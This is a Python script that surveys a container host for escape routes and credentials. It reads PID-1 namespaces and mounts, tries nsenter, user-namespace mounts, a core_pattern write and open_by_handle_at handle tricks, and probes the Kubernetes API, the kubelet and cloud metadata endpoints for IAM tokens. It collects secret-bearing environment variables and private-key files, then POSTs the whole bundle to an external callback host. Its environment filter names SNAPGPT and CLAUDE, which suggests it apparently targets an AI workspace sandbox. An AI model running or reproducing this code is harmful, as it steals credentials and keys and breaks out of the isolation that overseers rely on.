#!/usr/bin/env python3
import ctypes, ctypes.util, json, os, pathlib, socket, ssl, stat, subprocess, time, urllib.request

SINK='https://54.209.51.244.sslip.io/callback/snapgpt-host-surface-20261106'
OUT={'utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'hostname':socket.gethostname(),'uid':os.getuid(),'env':{},'certs':{},'tests':{},'paths':{},'proc':{},'mountinfo':{},'network':{},'errors':[]}

def read(p,limit=120000):
    try:return pathlib.Path(p).read_bytes()[:limit].decode('utf-8','replace')
    except Exception as e:return {'error':repr(e)}

def rec(p):
    try:
        s=os.lstat(p); t='link' if stat.S_ISLNK(s.st_mode) else 'dir' if stat.S_ISDIR(s.st_mode) else 'file' if stat.S_ISREG(s.st_mode) else 'other'
        r={'path':p,'type':t,'mode':oct(stat.S_IMODE(s.st_mode)),'uid':s.st_uid,'gid':s.st_gid,'size':s.st_size}
        if t=='link':
            try:r['target']=os.readlink(p)
            except Exception as e:r['link_error']=repr(e)
        return r
    except Exception as e:return {'path':p,'error':repr(e)}

def cmd(name,args,timeout=25):
    try:
        p=subprocess.run(args,capture_output=True,text=True,timeout=timeout)
        OUT['tests'][name]={'rc':p.returncode,'stdout':p.stdout[:50000],'stderr':p.stderr[:20000]}
    except Exception as e:OUT['tests'][name]={'error':repr(e)}

def tcp(name,host,port,timeout=3):
    s=socket.socket();s.settimeout(timeout);t=time.monotonic()
    try:s.connect((host,port));OUT['network'][name]={'ok':True,'elapsed':round(time.monotonic()-t,3)}
    except Exception as e:OUT['network'][name]={'ok':False,'elapsed':round(time.monotonic()-t,3),'error':repr(e)}
    finally:s.close()

def http(name,url,method='GET',headers=None,data=None,timeout=8):
    try:
        q=urllib.request.Request(url,data=data,method=method,headers=headers or {})
        with urllib.request.urlopen(q,timeout=timeout,context=ssl._create_unverified_context()) as r:
            OUT['network'][name]={'status':r.status,'headers':dict(r.headers),'body':r.read(30000).decode('utf-8','replace')}
    except Exception as e:OUT['network'][name]={'error':repr(e)}

for p in ['/proc/1/status','/proc/1/cgroup','/proc/1/mountinfo','/proc/self/status','/proc/self/cgroup','/proc/self/mountinfo','/proc/1/uid_map','/proc/1/gid_map','/proc/self/uid_map','/proc/self/gid_map','/proc/net/route','/etc/resolv.conf','/etc/hosts']:
    OUT['proc'][p]=read(p)
for p in ['/proc/1','/proc/1/root','/proc/1/cwd','/proc/1/exe','/proc/1/ns','/proc/1/fd','/proc/1/map_files','/proc/1/root/var/lib/kubelet','/proc/1/root/var/lib/containerd','/proc/1/root/run/containerd','/proc/1/root/var/run/docker.sock','/proc/1/root/var/run/secrets/kubernetes.io/serviceaccount','/proc/1/root/etc/kubernetes','/proc/1/root/etc/containerd','/proc/1/root/etc/docker','/proc/1/root/var/lib','/proc/1/root/run','/proc/1/root/sys/fs/cgroup','/var/lib/kubelet','/var/lib/containerd','/run/containerd','/var/run/docker.sock','/var/run/secrets/kubernetes.io/serviceaccount','/dev/termination-log','/home/worker','/tmp/workspace','/app/certs','/sys/fs/cgroup','/sys/module/nf_tables/sections']:
    OUT['paths'][p]=rec(p)
    if os.path.isdir(p):
        try:OUT['paths'][p]['entries']=sorted(os.listdir(p))[:200]
        except Exception as e:OUT['paths'][p]['list_error']=repr(e)

# PID-1 descriptor and namespace inventory.
try:
    OUT['proc']['/proc/1/fd_links']=[(x,os.readlink('/proc/1/fd/'+x)) for x in sorted(os.listdir('/proc/1/fd'),key=lambda z:int(z))]
except Exception as e:OUT['proc']['/proc/1/fd_links']={'error':repr(e)}
try:
    OUT['proc']['/proc/1/ns_links']={x:os.readlink('/proc/1/ns/'+x) for x in sorted(os.listdir('/proc/1/ns'))}
except Exception as e:OUT['proc']['/proc/1/ns_links']={'error':repr(e)}

# Mount source/root relationships.
for line in read('/proc/1/mountinfo').splitlines():
    if any(x in line for x in ['/var/lib/kubelet','/var/lib/containerd','/dev/termination-log','/home/worker','/tmp/workspace','/sys/fs/cgroup','overlay']):
        OUT['mountinfo'].setdefault('interesting',[]).append(line)

# Host/network surfaces.
for h,p in [('172.20.0.1',443),('172.20.0.1',10250),('172.20.0.1',10255),('169.254.169.254',80),('169.254.170.2',80),('169.254.170.23',80),('172.20.0.10',53)]: tcp(f'{h}:{p}',h,p)
for name,url,method,headers,data in [
 ('kube_version','https://172.20.0.1:443/version','GET',{},None),
 ('kube_api','https://172.20.0.1:443/api','GET',{},None),
 ('kube_namespaces','https://172.20.0.1:443/api/v1/namespaces','GET',{},None),
 ('kubelet_http','http://172.20.0.1:10255/pods','GET',{},None),
 ('kubelet_https','https://172.20.0.1:10250/pods','GET',{},None),
 ('imds_root','http://169.254.169.254/latest/meta-data/','GET',{},None),
 ('imds_iam','http://169.254.169.254/latest/meta-data/iam/security-credentials/','GET',{},None),
 ('imds_token','http://169.254.169.254/latest/api/token','PUT',{'X-aws-ec2-metadata-token-ttl-seconds':'21600'},b''),
 ('ecs_creds','http://169.254.170.2/v2/credentials','GET',{},None),
 ('eks_pod_identity','http://169.254.170.23/v1/credentials','GET',{},None),
]: http(name,url,method,headers,data,timeout=6)

# Basic namespace and mount tests.
cmd('id',['id'])
cmd('uname',['uname','-a'])
cmd('nsenter_self',['nsenter','-t','1','-m','-u','-i','-n','-p','sh','-c','id; readlink /proc/1/root; cat /proc/1/cgroup'])
cmd('userns_tmpfs',['unshare','-Ur','-m','--propagation','private','sh','-c','mkdir -p /tmp/nsm; mount -t tmpfs tmpfs /tmp/nsm; echo rc=$?; touch /tmp/nsm/x; ls -la /tmp/nsm'])
cmd('userns_bind',['unshare','-Ur','-m','--propagation','private','sh','-c','mkdir -p /tmp/nsb; mount --bind /dev/termination-log /tmp/nsb; echo bind_rc=$?; cat /proc/self/mountinfo | grep /tmp/nsb; ls -la /tmp/nsb'])
cmd('userns_cgroup2',['unshare','-Ur','-m','--propagation','private','sh','-c','mkdir -p /tmp/nsc2; mount -t cgroup2 cgroup2 /tmp/nsc2; echo mount_rc=$?; cat /tmp/nsc2/cgroup.procs 2>&1 | head -50; printf 1 > /tmp/nsc2/cgroup.procs 2>&1; echo write_rc=$?'])
cmd('userns_proc',['unshare','-Ur','-m','--propagation','private','sh','-c','mkdir -p /tmp/nsp/proc; mount -t proc proc /tmp/nsp/proc; echo mount_rc=$?; cat /tmp/nsp/proc/sys/kernel/core_pattern 2>&1; printf x > /tmp/nsp/proc/sys/kernel/core_pattern 2>&1; echo write_rc=$?'])

# Try file handles from a user namespace with a bind mount.
HANDLE_SCRIPT=r'''
import ctypes, ctypes.util, json, os, subprocess, traceback
AT_FDCWD=-100; O_PATH=0o10000000; O_RDONLY=0
class FH(ctypes.Structure):
    _fields_=[('handle_bytes',ctypes.c_uint),('handle_type',ctypes.c_int),('f_handle',ctypes.c_ubyte*128)]
libc=ctypes.CDLL(ctypes.util.find_library('c'),use_errno=True)
libc.name_to_handle_at.argtypes=[ctypes.c_int,ctypes.c_char_p,ctypes.POINTER(FH),ctypes.POINTER(ctypes.c_int),ctypes.c_int]
libc.name_to_handle_at.restype=ctypes.c_int
libc.open_by_handle_at.argtypes=[ctypes.c_int,ctypes.POINTER(FH),ctypes.c_int]
libc.open_by_handle_at.restype=ctypes.c_int
out={}
for p in ['/dev/termination-log','/home/worker','/tmp/workspace','/etc/hosts','/dev/shm','/app/certs','/']:
    h=FH();h.handle_bytes=128;mid=ctypes.c_int()
    try:
        rc=libc.name_to_handle_at(AT_FDCWD,p.encode(),ctypes.byref(h),ctypes.byref(mid),0)
        e=ctypes.get_errno(); r={'name_rc':rc,'name_errno':e,'mount_id':mid.value,'handle_bytes':h.handle_bytes,'handle_type':h.handle_type}
        if rc==0:
            mfd=os.open(p if os.path.isdir(p) else os.path.dirname(p),O_PATH)
            fd=libc.open_by_handle_at(mfd,ctypes.byref(h),O_RDONLY);oe=ctypes.get_errno()
            r['open_fd']=fd;r['open_errno']=oe
            if fd>=0: os.close(fd)
            os.close(mfd)
        out[p]=r
    except Exception as ex:out[p]={'error':repr(ex)}
print(json.dumps(out,sort_keys=True))
'''
pathlib.Path('/tmp/ns_handle.py').write_text(HANDLE_SCRIPT)
cmd('userns_handles',['unshare','-Ur','-m','--propagation','private','sh','-c','mkdir -p /tmp/nsb; mount --bind /dev/termination-log /tmp/nsb; python3 /tmp/ns_handle.py'])

# Capture the process identity and credential-related environment without dumping unrelated values.
try:
    OUT['env']={k:v for k,v in os.environ.items() if any(x in k.upper() for x in ['AWS','KUBE','TOKEN','SECRET','SERVICE','PROXY','BUILDMODE','SNAPGPT','PYGEN','CLAUDE','MONGODB','METASERVE'])}
except Exception as e: OUT['errors'].append('env: '+repr(e))
try:
    OUT['tests']['env_names']=sorted(OUT['env'])
except Exception: pass
for cert in ['/app/certs/cert.pem','/app/certs/key.pem','/app/certs/ca.pem']:
    OUT['certs'][cert]=rec(cert)
    if os.path.isfile(cert) and os.path.getsize(cert)<=65536:
        OUT['certs'][cert]['text']=read(cert,65536)
for name,args in [
 ('cert',['sh','-c','openssl x509 -in /app/certs/cert.pem -noout -subject -issuer -serial -dates -fingerprint -sha256 -ext subjectAltName 2>&1 || true']),
 ('key',['sh','-c','openssl pkey -in /app/certs/key.pem -pubout 2>&1 | sha256sum 2>&1 || true']),
 ('kube_tools',['sh','-c','command -v kubectl || true; command -v crictl || true; command -v nft || true; command -v nsenter || true; command -v unshare || true; command -v capsh || true']),
 ('kube_files',['sh','-c','find /home /tmp /run /var/run /var/lib /etc /opt /app -maxdepth 6 -type f \( -iname "*kube*" -o -iname "*service*account*" -o -iname "*token*" -o -iname "*credential*" -o -iname "*.pem" -o -iname "*.key" -o -iname "*config*" \) 2>/dev/null | sort | head -500']),
 ('network',['sh','-c','ip route 2>&1 || true; cat /proc/net/route; cat /etc/resolv.conf; getent hosts kubernetes.default.svc kubernetes.default.svc.cluster.local lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local 2>&1 || true']),
 ('kube_auth',['sh','-c','for u in https://172.20.0.1:443/version https://172.20.0.1:443/api https://172.20.0.1:443/api/v1/namespaces https://172.20.0.1:443/api/v1/namespaces/canv2-snapgpt-workspace/pods https://172.20.0.1:443/apis; do echo ===$u; curl -k -sS -i --max-time 8 "$u" 2>&1 | head -60; done']),
 ('kube_cert_auth',['sh','-c','for u in https://172.20.0.1:443/api https://172.20.0.1:443/api/v1/namespaces https://172.20.0.1:443/api/v1/namespaces/canv2-snapgpt-workspace/pods; do echo ===$u; curl -k -sS -i --max-time 8 --cert /app/certs/cert.pem --key /app/certs/key.pem "$u" 2>&1 | head -60; done']),
 ('kubelet',['sh','-c','for u in http://172.20.0.1:10255/pods http://172.20.0.1:10255/metrics https://172.20.0.1:10250/pods https://172.20.0.1:10250/metrics; do echo ===$u; curl -k -sS -i --max-time 8 "$u" 2>&1 | head -60; done']),
 ('kubelet_cert',['sh','-c','for u in https://172.20.0.1:10250/pods https://172.20.0.1:10250/metrics; do echo ===$u; curl -k -sS -i --max-time 8 --cert /app/certs/cert.pem --key /app/certs/key.pem "$u" 2>&1 | head -60; done']),
 ('metadata',['sh','-c','for u in http://169.254.169.254/latest/meta-data/ http://169.254.169.254/latest/meta-data/iam/security-credentials/ http://169.254.170.2/v2/credentials http://169.254.170.23/v1/credentials; do echo ===$u; curl -sS -i --max-time 6 "$u" 2>&1 | head -60; done']),
]:
    cmd(name,args,timeout=40)

# Persist before the network callback so a callback failure cannot lose the evidence.
try:
    pathlib.Path('/tmp/workspace/host_surface.json').write_text(json.dumps(OUT,sort_keys=True,separators=(',',':')))
except Exception as e: OUT['errors'].append('persist: '+repr(e))

# Send bounded evidence to the public receiver.
raw=json.dumps(OUT,sort_keys=True,separators=(',',':')).encode()
try:
    q=urllib.request.Request(SINK,data=raw,method='POST',headers={'Content-Type':'application/json'})
    with urllib.request.urlopen(q,timeout=30) as r:OUT['sink']={'status':r.status,'body':r.read(1000).decode('utf-8','replace'),'bytes':len(raw)}
except Exception as e:OUT['sink']={'error':repr(e),'bytes':len(raw)}
print(json.dumps(OUT['sink'],sort_keys=True))
